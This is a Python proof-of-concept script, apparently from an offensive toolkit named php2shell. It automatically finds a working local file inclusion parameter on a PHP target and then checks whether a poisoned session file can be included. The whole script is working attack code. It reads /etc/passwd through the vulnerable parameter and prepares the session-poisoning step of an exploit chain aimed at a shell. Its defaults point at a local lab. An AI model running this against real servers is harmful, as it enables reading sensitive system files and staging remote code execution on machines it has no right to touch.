#!/usr/bin/env python3
"""Verify automatic LFI parameter discovery against a lab sink.

Public lineage: murrez/php2shell's `discover_active_lfi_route()` replaces
the manual `?page=` guess after session poisoning. This POC does the same
with a small wordlist and a known-readable file, then (optionally) checks
that a session file is includable through the discovered parameter.

Usage:
  python3 poc/verify_lfi_discovery.py --target http://127.0.0.1:18097
  python3 poc/verify_lfi_discovery.py --target http://127.0.0.1:18096 \
      --path /lfi.php --include /etc/passwd
"""

import argparse
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from php2shell import lfi, probe


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="http://127.0.0.1:18097")
    ap.add_argument("--path", default="/lfi.php")
    ap.add_argument("--include", default="/etc/passwd")
    ap.add_argument("--marker", default="root:x:0:0")
    ap.add_argument("--params", default=None,
                    help="comma-separated param list (default: built-in)")
    ap.add_argument("--sid", default=None,
                    help="also test inclusion of /tmp/sessions/sess_<sid>")
    args = ap.parse_args()

    scheme, host, port = probe.parse_target(args.target)
    if scheme != "http":
        sys.exit("lab targets are plain HTTP")
    params = [p.strip() for p in args.params.split(",")] if args.params else None

    print("[*] LFI parameter discovery")
    print(f"    target: {host}:{port}{args.path}  include={args.include}")
    print()

    hits = lfi.discover(host, port, args.path, args.include, args.marker,
                        params=params)
    if hits:
        print(f"[EVIDENCE] {len(hits)} working parameter(s):")
        for param, value, status in hits:
            print(f"    ?{param}={value}  [{status}]")
        print()
        print("    Chain A can use the first hit instead of a hardcoded")
        print("    'page' parameter. The include marker proves the sink")
        print("    returned file contents, not a 200 error page.")
    else:
        print("[!] No working include parameter found.")
        print("    The sink may not exist, may filter traversal, or may")
        print("    require a different known-readable file/marker.")

    if args.sid:
        print()
        print(f"[*] Session-file inclusion for sid={args.sid}")
        session_hits = lfi.discover_session_include(
            host, port, args.sid, args.path, marker=b"PHP2SHELL",
            params=params,
        )
        if session_hits:
            for param, value, status in session_hits:
                print(f"    ?{param}={value}  [{status}]")
            print("[EVIDENCE] session file is includable via the discovered param")
        else:
            print("    no session-file include observed (marker PHP2SHELL)")
            print("    note: inject the marker first (Chain A write step)")

    return 0 if hits else 1


if __name__ == "__main__":
    raise SystemExit(main())
